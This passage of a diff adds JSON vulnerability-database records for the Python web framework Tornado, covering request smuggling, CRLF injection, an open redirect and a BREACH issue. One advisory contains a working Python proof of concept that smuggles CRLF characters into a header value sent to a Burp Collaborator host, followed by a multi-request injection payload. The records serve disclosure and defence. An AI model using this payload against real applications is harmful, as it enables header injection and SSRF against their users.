+      "primary_id": "GHSA-qppv-j76h-2rpx",
+      "aliases": [],
+      "cve_ids": [],
+      "ecosystem": "PyPI",
+      "upstream_name": "tornado",
+      "summary": "Tornado vulnerable to HTTP request smuggling via improper parsing of `Content-Length` fields and chunk lengths",
+      "details": "## Summary\nTornado interprets `-`, `+`, and `_` in chunk length and `Content-Length` values, which are not allowed by the HTTP RFCs. This can result in request smuggling when Tornado is deployed behind certain proxies that interpret those non-standard characters differently. This is known to apply to older versions of haproxy, although the current release is not affected.\n\n## Details\nTornado uses the `int` constructor to parse the values of `Content-Length` headers and chunk lengths in the following locations:\n### `tornado/http1connection.py:445`\n```python3\n            self._expected_content_remaining = int(headers[\"Content-Length\"])\n```\n### `tornado/http1connection.py:621`\n```python3\n                content_length = int(headers[\"Content-Length\"])  # type: Optional[int]\n```\n### `tornado/http1connection.py:671`\n```python3\n            chunk_len = int(chunk_len_str.strip(), 16)\n```\nBecause `int(\"0_0\") == int(\"+0\") == int(\"-0\") == int(\"0\")`, using the `int` constructor to parse and validate strings that should contain only ASCII digits is not a good strategy. \n\n",
+      "published": "2023-08-14T21:34:17Z",
+      "modified": "2024-11-28T05:40:58.798097Z",
+      "severity": null,
+      "all_severity": [],
+      "references": [
+        {
+          "type": "WEB",
+          "url": "https://github.com/tornadoweb/tornado/security/advisories/GHSA-qppv-j76h-2rpx"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/tornadoweb/tornado/commit/b7a5dd29bb02950303ae96055082c12a1ea0a4fe"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/tornadoweb/tornado"
+        }
+      ],
+      "osv_url": "https://osv.dev/vulnerability/GHSA-qppv-j76h-2rpx",
+      "osv_ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "6.3.3"
+            }
+          ]
+        }
+      ],
+      "osv_versions": [
+        "0.2",
+        "1.0",
+        "1.1",
+        "1.1.1",
+        "1.2",
+        "1.2.1",
+        "2.0",
+        "2.1",
+        "2.1.1",
+        "2.2",
+        "2.2.1",
+        "2.3",
+        "2.4",
+        "2.4.1",
+        "3.0",
+        "3.0.1",
+        "3.0.2",
+        "3.1",
+        "3.1.1",
+        "3.2",
+        "3.2.1",
+        "3.2.2",
+        "4.0",
+        "4.0.1",
+        "4.0.2",
+        "4.1",
+        "4.1b2",
+        "4.2",
+        "4.2.1",
+        "4.2b1",
+        "4.3",
+        "4.3b1",
+        "4.3b2",
+        "4.4",
+        "4.4.1",
+        "4.4.2",
+        "4.4.3",
+        "4.4b1",
+        "4.5",
+        "4.5.1",
+        "4.5.2",
+        "4.5.3",
+        "4.5b1",
+        "4.5b2",
+        "5.0",
+        "5.0.1",
+        "5.0.2",
+        "5.0a1",
+        "5.0b1",
+        "5.1",
+        "5.1.1",
+        "5.1b1",
+        "6.0",
+        "6.0.1",
+        "6.0.2",
+        "6.0.3",
+        "6.0.4",
+        "6.0a1",
+        "6.0b1",
+        "6.1",
+        "6.1b1",
+        "6.1b2",
+        "6.2",
+        "6.2b1",
+        "6.2b2",
+        "6.3",
+        "6.3.1",
+        "6.3.2",
+        "6.3b1"
+      ],
+      "affected_conda_versions": [
+        "4.2.1",
+        "4.3",
+        "4.4",
+        "4.4.1",
+        "4.4.2",
+        "4.4.3",
+        "4.5.1",
+        "4.5.2",
+        "4.5.3",
+        "5.0.1",
+        "5.0.2",
+        "5.1",
+        "5.1.1",
+        "6.0.1",
+        "6.0.2",
+        "6.0.3",
+        "6.0.4",
+        "6.1",
+        "6.2",
+        "6.3",
+        "6.3.2"
+      ]
+    },
+    {
+      "id": "GHSA-w235-7p84-xx57",
+      "primary_id": "GHSA-w235-7p84-xx57",
+      "aliases": [],
+      "cve_ids": [],
+      "ecosystem": "PyPI",
+      "upstream_name": "tornado",
+      "summary": "Tornado has a CRLF injection in CurlAsyncHTTPClient headers",
+      "details": "### Summary\nTornado\u2019s `curl_httpclient.CurlAsyncHTTPClient` class is vulnerable to CRLF (carriage return/line feed) injection in the request headers.\n\n### Details\nWhen an HTTP request is sent using `CurlAsyncHTTPClient`, Tornado does not reject carriage return (\\r) or line feed (\\n) characters in the request headers. As a result, if an application includes an attacker-controlled header value in a request sent using `CurlAsyncHTTPClient`, the attacker can inject arbitrary headers into the request or cause the application to send arbitrary requests to the specified server.\n\nThis behavior differs from that of the standard `AsyncHTTPClient` class, which does reject CRLF characters.\n\nThis issue appears to stem from libcurl's (as well as pycurl's) lack of validation for the [`HTTPHEADER`](https://curl.se/libcurl/c/CURLOPT_HTTPHEADER.html) option. libcurl\u2019s documentation states:\n\n> The headers included in the linked list must not be CRLF-terminated, because libcurl adds CRLF after each header item itself. Failure to comply with this might result in strange behavior. libcurl passes on the verbatim strings you give it, without any filter or other safe guards. That includes white space and control characters.\n\npycurl similarly appears to assume that the headers adhere to the correct format. Therefore, without any validation on Tornado\u2019s part, header names and values are included verbatim in the request sent by `CurlAsyncHTTPClient`, including any control characters that have special meaning in HTTP semantics.\n\n### PoC\nThe issue can be reproduced using the following script:\n\n```python\nimport asyncio\n\nfrom tornado import httpclient\nfrom tornado import curl_httpclient\n\nasync def main():\n    http_client = curl_httpclient.CurlAsyncHTTPClient()\n\n    request = httpclient.HTTPRequest(\n        # Burp Collaborator payload\n        \"http://727ymeu841qydmnwlol261ktkkqbe24qt.oastify.com/\",\n        method=\"POST\",\n        body=\"body\",\n        # Injected header using CRLF characters\n        headers={\"Foo\": \"Bar\\r\\nHeader: Injected\"}\n    )\n\n    response = await http_client.fetch(request)\n    print(response.body)\n\n    http_client.close()\n\nif __name__ == \"__main__\":\n    asyncio.run(main())\n```\n\nWhen the specified server receives the request, it contains the injected header (`Header: Injected`) on its own line:\n\n```http\nPOST / HTTP/1.1\nHost: 727ymeu841qydmnwlol261ktkkqbe24qt.oastify.com\nUser-Agent: Mozilla/5.0 (compatible; pycurl)\nAccept: */*\nAccept-Encoding: gzip,deflate\nFoo: Bar\nHeader: Injected\nContent-Length: 4\nContent-Type: application/x-www-form-urlencoded\n\nbody\n```\n\nThe attacker can also construct entirely new requests using a payload with multiple CRLF sequences. For example, specifying a header value of `\\r\\n\\r\\nPOST /attacker-controlled-url HTTP/1.1\\r\\nHost: 727ymeu841qydmnwlol261ktkkqbe24qt.oastify.com` results in the server receiving an additional, attacker-controlled request:\n\n```http\nPOST /attacker-controlled-url HTTP/1.1\nHost: 727ymeu841qydmnwlol261ktkkqbe24qt.oastify.com\nContent-Length: 4\nContent-Type: application/x-www-form-urlencoded\n\nbody\n```\n\n### Impact\nApplications using the Tornado library to send HTTP requests with untrusted header data are affected. This issue may facilitate the exploitation of server-side request forgery (SSRF) vulnerabilities.",
+      "published": "2024-06-06T21:46:31Z",
+      "modified": "2026-02-04T04:05:10.949374Z",
+      "severity": {
+        "type": "CVSS_V3",
+        "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N"
+      },
+      "all_severity": [
+        {
+          "type": "CVSS_V3",
+          "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N"
+        }
+      ],
+      "references": [
+        {
+          "type": "WEB",
+          "url": "https://github.com/tornadoweb/tornado/security/advisories/GHSA-w235-7p84-xx57"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/tornadoweb/tornado/commit/7786f09f84c9f3f2012c4cf3878417cb9f053669"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/tornadoweb/tornado"
+        }
+      ],
+      "osv_url": "https://osv.dev/vulnerability/GHSA-w235-7p84-xx57",
+      "osv_ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "6.4.1"
+            }
+          ]
+        }
+      ],
+      "osv_versions": [
+        "0.2",
+        "1.0",
+        "1.1",
+        "1.1.1",
+        "1.2",
+        "1.2.1",
+        "2.0",
+        "2.1",
+        "2.1.1",
+        "2.2",
+        "2.2.1",
+        "2.3",
+        "2.4",
+        "2.4.1",
+        "3.0",
+        "3.0.1",
+        "3.0.2",
+        "3.1",
+        "3.1.1",
+        "3.2",
+        "3.2.1",
+        "3.2.2",
+        "4.0",
+        "4.0.1",
+        "4.0.2",
+        "4.1",
+        "4.1b2",
+        "4.2",
+        "4.2.1",
+        "4.2b1",
+        "4.3",
+        "4.3b1",
+        "4.3b2",
+        "4.4",
+        "4.4.1",
+        "4.4.2",
+        "4.4.3",
+        "4.4b1",
+        "4.5",
+        "4.5.1",
+        "4.5.2",
+        "4.5.3",
+        "4.5b1",
+        "4.5b2",
+        "5.0",
+        "5.0.1",
+        "5.0.2",
+        "5.0a1",
+        "5.0b1",
+        "5.1",
+        "5.1.1",
+        "5.1b1",
+        "6.0",
+        "6.0.1",
+        "6.0.2",
+        "6.0.3",
+        "6.0.4",
+        "6.0a1",
+        "6.0b1",
+        "6.1",
+        "6.1b1",
+        "6.1b2",
+        "6.2",
+        "6.2b1",
+        "6.2b2",
+        "6.3",
+        "6.3.1",
+        "6.3.2",
+        "6.3.3",
+        "6.3b1",
+        "6.4",
+        "6.4b1"
+      ],
+      "affected_conda_versions": [
+        "4.2.1",
+        "4.3",
+        "4.4",
+        "4.4.1",
+        "4.4.2",
+        "4.4.3",
+        "4.5.1",
+        "4.5.2",
+        "4.5.3",
+        "5.0.1",
+        "5.0.2",
+        "5.1",
+        "5.1.1",
+        "6.0.1",
+        "6.0.2",
+        "6.0.3",
+        "6.0.4",
+        "6.1",
+        "6.2",
+        "6.3",
+        "6.3.2",
+        "6.3.3",
+        "6.4"
+      ]
+    },
+    {
+      "id": "PYSEC-2023-75",
+      "primary_id": "CVE-2023-28370",
+      "aliases": [
+        "CVE-2023-28370",
+        "GHSA-hj3f-6gcp-jg8j"
+      ],
+      "cve_ids": [
+        "CVE-2023-28370"
+      ],
+      "ecosystem": "PyPI",
+      "upstream_name": "tornado",
+      "summary": null,
+      "details": "Open redirect vulnerability in Tornado versions 6.3.1 and earlier allows a remote unauthenticated attacker to redirect a user to an arbitrary web site and conduct a phishing attack by having user access a specially crafted URL.",
+      "published": "2023-05-25T10:15:00Z",
+      "modified": "2023-11-08T04:12:10.458637Z",
+      "severity": null,
+      "all_severity": [],
+      "references": [
+        {
+          "type": "WEB",
+          "url": "https://jvn.jp/en/jp/JVN45127776/"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/tornadoweb/tornado/releases/tag/v6.3.2"
+        }
+      ],
+      "osv_url": "https://osv.dev/vulnerability/PYSEC-2023-75",
+      "osv_ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "6.3.2"
+            }
+          ]
+        }
+      ],
+      "osv_versions": [
+        "0.2",
+        "1.0",
+        "1.1",
+        "1.1.1",
+        "1.2",
+        "1.2.1",
+        "2.0",
+        "2.1",
+        "2.1.1",
+        "2.2",
+        "2.2.1",
+        "2.3",
+        "2.4",
+        "2.4.1",
+        "3.0",
+        "3.0.1",
+        "3.0.2",
+        "3.1",
+        "3.1.1",
+        "3.2",
+        "3.2.1",
+        "3.2.2",
+        "4.0",
+        "4.0.1",
+        "4.0.2",
+        "4.1",
+        "4.1b2",
+        "4.2",
+        "4.2.1",
+        "4.2b1",
+        "4.3",
+        "4.3b1",
+        "4.3b2",
+        "4.4",
+        "4.4.1",
+        "4.4.2",
+        "4.4.3",
+        "4.4b1",
+        "4.5",
+        "4.5.1",
+        "4.5.2",
+        "4.5.3",
+        "4.5b1",
+        "4.5b2",
+        "5.0",
+        "5.0.1",
+        "5.0.2",
+        "5.0a1",
+        "5.0b1",
+        "5.1",
+        "5.1.1",
+        "5.1b1",
+        "6.0",
+        "6.0.1",
+        "6.0.2",
+        "6.0.3",
+        "6.0.4",
+        "6.0a1",
+        "6.0b1",
+        "6.1",
+        "6.1b1",
+        "6.1b2",
+        "6.2",
+        "6.2b1",
+        "6.2b2",
+        "6.3",
+        "6.3.1",
+        "6.3b1"
+      ],
+      "affected_conda_versions": [
+        "4.2.1",
+        "4.3",
+        "4.4",
+        "4.4.1",
+        "4.4.2",
+        "4.4.3",
+        "4.5.1",
+        "4.5.2",
+        "4.5.3",
+        "5.0.1",
+        "5.0.2",
+        "5.1",
+        "5.1.1",
+        "6.0.1",
+        "6.0.2",
+        "6.0.3",
+        "6.0.4",
+        "6.1",
+        "6.2",
+        "6.3"
+      ]
+    },
+    {
+      "id": "GHSA-8vpw-mgpf-mpvv",
+      "primary_id": "CVE-2014-9720",
+      "aliases": [
+        "CVE-2014-9720",
+        "PYSEC-2020-213"
+      ],
+      "cve_ids": [
+        "CVE-2014-9720"
+      ],
+      "ecosystem": "PyPI",
+      "upstream_name": "tornado",
+      "summary": "Tornado XSRF cookie allows side-channel attack against TLS (BREACH attack)",
+      "details": "Tornado before 3.2.2 sends arbitrary responses that contain a fixed CSRF token and may be sent with HTTP compression, which makes it easier for remote attackers to conduct a BREACH attack and determine this token via a series of crafted requests.",
+      "published": "2022-05-17T19:57:19Z",
+      "modified": "2024-11-13T23:00:51.921404Z",
+      "severity": {
+        "type": "CVSS_V4",
+        "score": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:P/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N"
+      },
+      "all_severity": [
+        {
+          "type": "CVSS_V3",
+          "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N"
+        },
+        {
+          "type": "CVSS_V4",
+          "score": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:P/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N"
+        }
+      ],
+      "references": [
+        {
+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2014-9720"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/tornadoweb/tornado/commit/1c36307463b1e8affae100bf9386948e6c1b2308"
+        },
+        {
+          "type": "WEB",
+          "url": "https://bugzilla.novell.com/show_bug.cgi?id=930362"
+        },
+        {
+          "type": "WEB",
+          "url": "https://bugzilla.redhat.com/show_bug.cgi?id=1222816"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/pypa/advisory-database/tree/main/vulns/tornado/PYSEC-2020-213.yaml"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/tornadoweb/tornado"
+        },
+        {
+          "type": "WEB",
+          "url": "http://openwall.com/lists/oss-security/2015/05/19/4"
+        },
+        {
+          "type": "WEB",
+          "url": "http://www.tornadoweb.org/en/stable/releases/v3.2.2.html"
+        }
+      ],
+      "osv_url": "https://osv.dev/vulnerability/GHSA-8vpw-mgpf-mpvv",
+      "osv_ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "3.2.2"
+            }
+          ]
+        }
+      ],
+      "osv_versions": [
+        "0.2",
+        "1.0",
+        "1.1",
+        "1.1.1",
+        "1.2",
+        "1.2.1",
+        "2.0",
+        "2.1",
+        "2.1.1",
+        "2.2",
+        "2.2.1",
+        "2.3",
+        "2.4",
+        "2.4.1",
+        "3.0",
+        "3.0.1",
+        "3.0.2",
+        "3.1",
+        "3.1.1",
+        "3.2",
+        "3.2.1"
+      ],
+      "affected_conda_versions": []
+    },
+    {
+      "id": "GHSA-f7fv-v9rh-prvc",
+      "primary_id": "CVE-2012-2374",
+      "aliases": [
+        "CVE-2012-2374",
+        "PYSEC-2012-5"
+      ],
+      "cve_ids": [
+        "CVE-2012-2374"
+      ],
+      "ecosystem": "PyPI",
+      "upstream_name": "tornado",
+      "summary": "Tornado CRLF injection vulnerability",
+      "details": "CRLF injection vulnerability in the `tornado.web.RequestHandler.set_header` function in Tornado before 2.2.1 allows remote attackers to inject arbitrary HTTP headers and conduct HTTP response splitting attacks via crafted input.",
+      "published": "2022-05-17T05:23:55Z",
+      "modified": "2024-11-18T22:24:23.207635Z",
+      "severity": {
+        "type": "CVSS_V4",
+        "score": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:H/VA:N/SC:N/SI:N/SA:N"
+      },
+      "all_severity": [
+        {
+          "type": "CVSS_V3",
+          "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N"
+        },
+        {
+          "type": "CVSS_V4",
+          "score": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:H/VA:N/SC:N/SI:N/SA:N"
+        }
+      ],
+      "references": [
+        {
+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2012-2374"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/tornadoweb/tornado/commit/1ae91f6d58e6257e0ab49d295d8741ce1727bdb7"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/pypa/advisory-database/tree/main/vulns/tornado/PYSEC-2012-5.yaml"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/tornadoweb/tornado"
+        },
+        {
+          "type": "WEB",
+          "url": "https://web.archive.org/web/20140720192646/http://secunia.com/advisories/49185"
+        },
+        {
+          "type": "WEB",
+          "url": "https://web.archive.org/web/20200229124524/http://www.securityfocus.com/bid/53612"
+        },
+        {
+          "type": "WEB",
+          "url": "http://openwall.com/lists/oss-security/2012/05/18/12"
+        },
+        {
+          "type": "WEB",
+          "url": "http://www.openwall.com/lists/oss-security/2012/05/18/6"
+        },
+        {
+          "type": "WEB",
+          "url": "http://www.tornadoweb.org/documentation/releases/v2.2.1.html"
+        }
+      ],
+      "osv_url": "https://osv.dev/vulnerability/GHSA-f7fv-v9rh-prvc",
+      "osv_ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "2.2.1"
+            }
+          ]
+        }
+      ],
+      "osv_versions": [
+        "0.2",
+        "1.0",
+        "1.1",
+        "1.1.1",
+        "1.2",
+        "1.2.1",
+        "2.0",
+        "2.1",
+        "2.1.1",
+        "2.2"
+      ],
+      "affected_conda_versions": []
+    },
+    {
+      "id": "PYSEC-2012-5",
+      "primary_id": "CVE-2012-2374",
+      "aliases": [
+        "CVE-2012-2374",
+        "GHSA-f7fv-v9rh-prvc"
+      ],
+      "cve_ids": [
+        "CVE-2012-2374"
+      ],
+      "ecosystem": "PyPI",
+      "upstream_name": "tornado",
+      "summary": null,
+      "details": "CRLF injection vulnerability in the tornado.web.RequestHandler.set_header function in Tornado before 2.2.1 allows remote attackers to inject arbitrary HTTP headers and conduct HTTP response splitting attacks via crafted input.",
+      "published": "2012-05-23T20:55:00Z",
+      "modified": "2024-05-01T11:26:45.048038Z",
+      "severity": null,
+      "all_severity": [],
+      "references": [
+        {
+          "type": "WEB",
+          "url": "http://www.tornadoweb.org/documentation/releases/v2.2.1.html"
+        },
+        {
+          "type": "WEB",
+          "url": "http://openwall.com/lists/oss-security/2012/05/18/12"
+        },
+        {
+          "type": "ADVISORY",
+          "url": "http://secunia.com/advisories/49185"
+        },
+        {
+          "type": "WEB",
+          "url": "http://www.securityfocus.com/bid/53612"
+        },
+        {
+          "type": "WEB",
+          "url": "http://www.openwall.com/lists/oss-security/2012/05/18/6"
+        }
+      ],
+      "osv_url": "https://osv.dev/vulnerability/PYSEC-2012-5",
+      "osv_ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "2.2.1"
+            }
+          ]
+        }
+      ],
+      "osv_versions": [
+        "0.2",
+        "1.0",
+        "1.1",
+        "1.1.1",
+        "1.2",
+        "1.2.1",
+        "2.0",
+        "2.1",
+        "2.1.1",
+        "2.2"
+      ],
+      "affected_conda_versions": []
+    },
+    {
+      "id": "PYSEC-2020-213",
+      "primary_id": "CVE-2014-9720",
+      "aliases": [
+        "CVE-2014-9720",
+        "GHSA-8vpw-mgpf-mpvv"
+      ],
+      "cve_ids": [
+        "CVE-2014-9720"
+      ],
+      "ecosystem": "PyPI",
+      "upstream_name": "tornado",
+      "summary": null,
+      "details": "Tornado before 3.2.2 sends arbitrary responses that contain a fixed CSRF token and may be sent with HTTP compression, which makes it easier for remote attackers to conduct a BREACH attack and determine this token via a series of crafted requests.",
+      "published": "2020-01-24T18:15:00Z",
+      "modified": "2024-02-01T21:26:32.417097Z",
+      "severity": null,
+      "all_severity": [],
+      "references": [
+        {
+          "type": "FIX",
+          "url": "https://github.com/tornadoweb/tornado/commit/1c36307463b1e8affae100bf9386948e6c1b2308"
+        },
+        {
+          "type": "REPORT",
+          "url": "https://bugzilla.novell.com/show_bug.cgi?id=930362"
+        },
+        {
+          "type": "WEB",
+          "url": "http://openwall.com/lists/oss-security/2015/05/19/4"
+        },
+        {
+          "type": "REPORT",
+          "url": "https://bugzilla.redhat.com/show_bug.cgi?id=1222816"
+        },
+        {
+          "type": "WEB",
+          "url": "http://www.tornadoweb.org/en/stable/releases/v3.2.2.html"
+        }
+      ],
+      "osv_url": "https://osv.dev/vulnerability/PYSEC-2020-213",
+      "osv_ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "3.2.2"
+            }
+          ]
+        }
+      ],
+      "osv_versions": [
+        "0.2",
+        "1.0",
+        "1.1",
+        "1.1.1",
+        "1.2",
+        "1.2.1",
+        "2.0",
+        "2.1",
+        "2.1.1",
+        "2.2",
+        "2.2.1",
+        "2.3",
+        "2.4",
+        "2.4.1",
+        "3.0",
+        "3.0.1",
+        "3.0.2",
+        "3.1",
+        "3.1.1",
+        "3.2",
+        "3.2.1"
+      ],
+      "affected_conda_versions": []
+    }
+  ]
+}
